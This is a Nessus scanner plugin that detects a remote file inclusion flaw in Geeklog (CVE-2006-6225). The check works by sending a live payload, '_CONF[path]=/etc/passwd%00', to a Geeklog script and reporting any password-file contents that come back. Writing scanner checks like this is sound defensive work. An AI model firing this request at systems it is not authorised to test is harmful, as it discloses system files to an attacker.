#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21779);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2012/04/23 00:05:07 $");

  script_cve_id("CVE-2006-6225");
  script_bugtraq_id(18740);
  script_osvdb_id(
    35798,
    35799,
    35800,
    35801,
    35802,
    35803,
    35804,
    35805,
    35806,
    35807,
    35808,
    35809,
    35810,
    35811,
    35812
  );
  script_xref(name:"EDB-ID", value:"1963");

  script_name(english:"Geeklog Multiple Script _CONF[path] Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using Geeklog");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
remote file include attack.");
  script_set_attribute(attribute:"description", value:
"The version of Geeklog installed on the remote host fails to sanitize
input to the '_CONF[path]' parameter before using it in several
scripts to include PHP code.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
these flaws to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"see_also", value:"http://www.geeklog.net/article.php/so-called-exploit");
  script_set_attribute(attribute:"see_also", value:"http://www.geeklog.net/article.php/geeklog-1.4.0sr4");
  script_set_attribute(attribute:"solution", value:"Upgrade to Geeklog 1.4.0sr4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value:"2006/06/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/06/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:geeklog:geeklog");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("geeklog_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/geeklog");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/geeklog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # nb: some installs move files from public_html up a directory.
  foreach subdir (make_list("/..", ""))
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd%00";
    w = http_send_recv3(method:"GET",
      item:string(
        dir, subdir, "/plugins/spamx/BlackList.Examine.class.php?",
        "_CONF[path]=", file
      ), 
      port:port
    );
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0plugins/spamx/.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (contents)
      {
        report = string(
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
